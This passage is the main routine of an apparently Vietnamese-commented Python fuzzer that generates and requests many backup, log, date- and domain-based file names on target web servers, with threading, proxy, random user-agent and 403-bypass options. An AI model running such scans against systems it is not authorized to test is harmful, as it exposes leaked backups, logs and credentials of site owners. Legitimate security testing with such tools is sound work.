        try: filter_codes = [int(c.strip()) for c in args.filter_code.split(',')]
        except: print(f"{Colors.RED}[!] Lỗi -fc.{Colors.RESET}"); sys.exit(1)

    # --- SETUP PAYLOADS ---
    active_suffixes = DEFAULT_SUFFIXES
    if args.no_suffix: active_suffixes = []
    elif args.backup_ext:
        raw_exts = args.backup_ext.split(',')
        active_suffixes = ['.'+e.strip() if not e.strip().startswith('.') else e.strip() for e in raw_exts if e.strip()]

    active_infixes = DEFAULT_INFIXES
    if args.no_infix: active_infixes = []
    elif args.infix: active_infixes = [i.strip() for i in args.infix.split(',') if i.strip()]

    active_prefixes = DEFAULT_PREFIXES
    if args.no_prefix: active_prefixes = []
    elif args.prefix: active_prefixes = [p.strip() for p in args.prefix.split(',') if p.strip()]

    base_headers = {}
    if not args.random_agent: base_headers['User-Agent'] = 'Mozilla/5.0 (Backup-Fuzzer/2.7.0)'
    if args.headers:
        for h in args.headers:
            try: k, v = h.split(':', 1); base_headers[k.strip()] = v.strip()
            except: pass
    
    filters = {'exclude_sizes': [], 'exclude_regex': None, 'grep_regex': None}
    if args.exclude_sizes:
        filters['exclude_sizes'] = [int(float(s.strip())) for s in args.exclude_sizes.split(',')]
    if args.exclude_text: filters['exclude_regex'] = re.compile(args.exclude_text, re.IGNORECASE)
    if args.grep: filters['grep_regex'] = re.compile(args.grep, re.IGNORECASE)

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}

    # --- TARGETS ---
    target_list = []
    if args.url: target_list.append(args.url)
    if args.url_list and os.path.exists(args.url_list):
        with open(args.url_list, 'r', encoding='utf-8', errors='ignore') as f:
            target_list.extend([line.strip() for line in f if line.strip()])

    print(f"{Colors.BLUE}" + "="*60)
    print(f" TARGETS  : {len(target_list)} URLs")
    if args.output_file:
        print(f" OUTPUT   : {args.output_file}")
    if 'all' in match_codes: print(f" MATCH    : ALL")
    else: print(f" MATCH    : {match_codes}")
    if filter_codes: print(f" FILTER   : {filter_codes}")
    print("="*60 + f"{Colors.RESET}\n")

    # --- GENERATE ---
    all_scan_urls = []
    wordlist_endpoints = []
    
    # Date Payloads
    date_payloads = []
    
    # 1. Year Fuzzing
    if args.fuzz_year is not None:
        # Nếu == 0 (const) => Không có năm chỉ định, dùng mặc định
        # Nếu > 0 => Có năm chỉ định
        start_y = args.fuzz_year if args.fuzz_year > 0 else None
        date_payloads.extend(generate_year_payloads(start_y))

    # 2. Full Date Fuzzing (MM-YYYY or Range)
    if args.fuzz_date:
        full_date_p = generate_full_date_payloads(args.fuzz_date)
        date_payloads.extend(full_date_p)

    if date_payloads:
        date_payloads = list(set(date_payloads))
        print(f"{Colors.YELLOW}[*] Loaded {len(date_payloads)} date patterns.{Colors.RESET}")

    if args.wordlist and os.path.exists(args.wordlist):
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            wordlist_endpoints = list(set([normalize_endpoint(line, args.ext) for line in f if line.strip()]))

    for target in target_list:
        # --- ONLY BYPASS 403 MODE ---
        if args.only_bypass_403:
             all_scan_urls.append(target)
             continue
        
        if 'FUZZ' in target:
            current_endpoints = list(wordlist_endpoints)
            
            # --- INTELLIGENT PATH CONTEXT GENERATION ---
            # Tự động sinh ra payload dựa trên domain và path hiện tại (Nếu có FUZZ)
            # VD: sub.domain.com/path/FUZZ -> sub_domain.zip, path.rar...
            context_payloads = generate_path_context_payloads(target, active_suffixes)
            if context_payloads:
                print(f"{Colors.YELLOW}[*] Generated {len(context_payloads)} smart context payloads from URL path.{Colors.RESET}")
                current_endpoints.extend(context_payloads)
                
            if not current_endpoints and args.scan_logs:
                 if args.scan_logs != "DEFAULT":
                     current_endpoints.extend([x.strip() for x in args.scan_logs.split(',') if x.strip()])
                 else:
                     current_endpoints.extend(COMMON_LOG_FILENAMES)
                 print(f"{Colors.YELLOW}[*] Using {len(current_endpoints)} log filenames for FUZZ replacement (no -w provided).{Colors.RESET}")

            if not current_endpoints:
                 print(f"{Colors.YELLOW}[!] Warning: URL contains FUZZ but no wordlist provided. Skipping {target}.{Colors.RESET}")
                 continue
            
            for ep in current_endpoints:
                 parts = ep.split('/')
                 filename = parts[-1]
                 parent = "/".join(parts[:-1])
                 if parent: parent += "/"
                 
                 # Note: FUZZ mode doesn't support automatic date/domain fuzzing deeply unless explicit logic added
                 variations = create_variations(filename, active_suffixes, active_infixes, active_prefixes, date_payloads)
                 for v in variations:
                     all_scan_urls.append(target.replace('FUZZ', parent + v))
            continue

        parsed = urllib.parse.urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        if not path.endswith('/'): path = os.path.dirname(path) + '/'
        
        
        # --- LOG SCAN MODE ---
        if args.scan_logs:
            # Xác định thư mục mục tiêu
            path = parsed.path
            if not path.endswith('/'): path += '/'
            
            # Với chế độ Scan Logs, ta KHÔNG dùng suffix/prefix/infix của backup code (như .php.bak, copy_of_...)
            # Mà dùng định nghĩa riêng cho Log (Rotation, Compression...)
            
            # 1. Suffixes cho log rotation/backup thường gặp (Added into filenames: error.log.1, error.log.old)
            log_rot_suffixes = ['.1', '.2', '.3', '.4', '.5', '.old', '.bak', '.1.gz', '.2.gz', '.gz', '.zip', '.tar.gz', '.rar', '.7z', '.swp', '~']
            
            # 2. Infixes cho log (Added inside filenames: error.old.log, error-2024.log)
            # Dùng để biến đổi: error.log -> error[INFIX].log
            log_infixes = [
                '.1', '.2', # error.1.log
                '_old', '-old', '.old', # error_old.log
                '_bak', '-bak', '.bak', # error.bak.log
                '_backup', '-backup', '.backup',
                '_copy', '-copy',
                '_err', '-err', '_error', '-error',
                '_acc', '-acc', '_access', '-access',
                '_new', '-new',
                '_test', '-test',
                '_rotate', '-rotate'
            ]
            
            # 2. Log không dùng prefix biến dị như code (ko có copy_of_error.log)
            # Nên ta để trống hoặc minimal
            log_prefixes_empty = []

            # Xác định danh sách file logs cần quét
            target_log_filenames = []
            
            # 1. Ưu tiên lấy từ tham số --scan-logs (VD: --scan-logs custom.log)
            if args.scan_logs and args.scan_logs != "DEFAULT":
                target_log_filenames.extend([x.strip() for x in args.scan_logs.split(',') if x.strip()])
                print(f"{Colors.YELLOW}[*] Scanning specific log filenames from CLI: {len(target_log_filenames)} items{Colors.RESET}")
            
            # 2. Lấy thêm từ wordlist -w (nếu có)
            if wordlist_endpoints:
                 target_log_filenames.extend(wordlist_endpoints)
                 print(f"{Colors.YELLOW}[*] Merged {len(wordlist_endpoints)} items from wordlist (-w) into Log Scan.{Colors.RESET}")

            # 3. Nếu không có gì cả (chỉ bật cờ --scan-logs), dùng list mặc định
            if not target_log_filenames:
                 target_log_filenames = COMMON_LOG_FILENAMES
                 print(f"{Colors.CYAN}[*] No custom logs provided. Using built-in common list ({len(COMMON_LOG_FILENAMES)} items).{Colors.RESET}")
            
            # Remove duplicates
            target_log_filenames = list(set(target_log_filenames))

            # Thêm các logs vào endpoint
            for log_file in target_log_filenames:
                ep = path + log_file
                
                # Check file gốc (error.log)
                all_scan_urls.append(base + ep)
                
                # Check variations riêng cho Log (error.log.1, error.log.gz, error.log.2024...)
                # Lưu ý: generate_mutations vẫn xử lý date_payloads (error.log.2024) rất tốt
                all_scan_urls.extend(generate_mutations(base, ep, log_rot_suffixes, log_infixes, log_prefixes_empty, date_payloads))
            
            # --- DATE-BASED LOG FILENAMES (Mới) ---
            # Define common extensions for Date & Domain logs
            log_exts = ['.log', '.logs', '.txt', '.zip', '.sql', '.xml', '.rar', '.tar.gz', '.gz', '.7z']
            
            # Generate: 2022-01-01.log, 2022_01_01.zip, ...
            if date_payloads:
                # Các prefix thường gặp đi kèm date (đứng trước): log_2022...
                log_prefixes = ['log_', 'logs_', 'error_', 'ERR_', 'access_', 'db_', 'database_', 'backup_', 'www_', 'data_', ''] 
                
                # Các suffix thường gặp đi kèm date (đứng sau): 2022_LOG...
                log_suffixes_date = ['_LOG', '_LOGS', '_ERR', '_Images', '_log', '_err', '_images', '_error', '_access', '_backup']

                for d in date_payloads:
                    # Clean date string (nếu muốn): Xóa ký tự đầu nếu là separator để tránh trùng lặp xấu
                    clean_d = d.lstrip('._-') 
                    
                    for ext in log_exts:
                         # 1. Pure Date + Ext: 2022-07-21.zip
                         all_scan_urls.append(base + path + clean_d + ext)
                         
                         # 2. Prefix + Date + Ext: error_2022-07-21.log
                         for p in log_prefixes:
                              if p: all_scan_urls.append(base + path + p + clean_d + ext)
                        
                         # 3. Date + Suffix + Ext: 2022-07-21_LOG.log (NEW)
                         for s in log_suffixes_date:
                              all_scan_urls.append(base + path + clean_d + s + ext)

            # --- DOMAIN-BASED LOG FILENAMES (Mới) ---
            # Generate: domain.log, dev.domain.com.zip, domain_error.log ...
            try:
                hostname = parsed.hostname
                if hostname:
                    domain_parts = hostname.split('.')
                    chk_names = set()
                    chk_names.add(hostname) # dev.domain.com
                    chk_names.add(hostname.replace('.', '_')) # dev_domain_com
                    
                    if len(domain_parts) >= 2:
                        chk_names.add(domain_parts[-2]) # domain
                        chk_names.add(f"{domain_parts[-2]}.{domain_parts[-1]}") # domain.com
                        chk_names.add(f"{domain_parts[-2]}_{domain_parts[-1]}") # domain_com
                    
                    # Log variation suffixes
                    # vd: domain.log, domain_error.log
                    log_suffixes = ['', '_error', '_access', '_backup', '_db', '_database', '-error', '-access', '-backup']

                    for name in chk_names:
                        for ext in log_exts:
                            for suf in log_suffixes:
                                all_scan_urls.append(base + path + name + suf + ext)
            except: pass

            continue
            continue

        if wordlist_endpoints:
            for ep in wordlist_endpoints:
                all_scan_urls.extend(generate_mutations(base, ep, active_suffixes, active_infixes, active_prefixes, date_payloads))
        else:
            path = parsed.path
            if not path or path == "/": continue
            ep = normalize_endpoint(path, args.ext)
            all_scan_urls.extend(generate_mutations(base, ep, active_suffixes, active_infixes, active_prefixes, date_payloads))
    
    # --- DOMAIN FUZZING (NEW) ---
    if args.fuzz_domain and not args.only_bypass_403:
        print(f"{Colors.YELLOW}[*] Generating domain-based payloads...{Colors.RESET}")
        for target in target_list:
            all_scan_urls.extend(generate_domain_payloads(target, active_suffixes, active_infixes, active_prefixes, date_payloads))

    all_scan_urls = list(set(all_scan_urls))
    total = len(all_scan_urls)
    
    # Auto-enable bypass_403 if only_bypass_403 is set
    if args.only_bypass_403:
        args.bypass_403 = True
    
    if total == 0:
        print(f"{Colors.RED}[!] Không có payload.{Colors.RESET}"); sys.exit(0)

    print(f"{Colors.BLUE}[*] Scanning {total} payloads...{Colors.RESET}\n")

    # --- OPTIMIZATION: SESSION REUSE ---
    session = requests.Session()
    adapter = HTTPAdapter(pool_connections=args.threads, pool_maxsize=args.threads)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    # --- SMART 404 DETECTION Đang Phát Triển Tiếp Phần Này---
    soft_404_signatures = {}
    if args.smart_404:
        print(f"{Colors.YELLOW}[*] Detecting Soft 404 signatures (this may take a few seconds)...{Colors.RESET}")
        
        # Lấy danh sách base domain duy nhất
        unique_bases = set()
        for url in all_scan_urls:
             try:
                 p = urllib.parse.urlparse(url)
                 unique_bases.add(f"{p.scheme}://{p.netloc}")
             except: pass
        
        for base in unique_bases:
            sig = detect_soft_404(session, base, base_headers, proxies)
            if sig:
                soft_404_signatures[base] = sig
                print(f"{Colors.GREY}   + {base} -> 404 Sig: Status={sig['status']}, AvgSize={sig['avg_size']:.0f}, Redirect={sig['is_redirect']}{Colors.RESET}")


    try:
        executor = ThreadPoolExecutor(max_workers=args.threads)
        futures = [executor.submit(check_url, session, link, base_headers, proxies, filters, args.random_agent, args.delay, match_codes, filter_codes, args.output_file, args.timeout, soft_404_signatures, 0, args.bypass_403) for link in all_scan_urls]
        
        for _ in tqdm(as_completed(futures), total=total, unit="req", dynamic_ncols=True, mininterval=0.2,
                      bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"):
            pass
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Stopping...{Colors.RESET}")
        executor.shutdown(wait=False)
        os._exit(0)

if __name__ == "__main__":
    main()
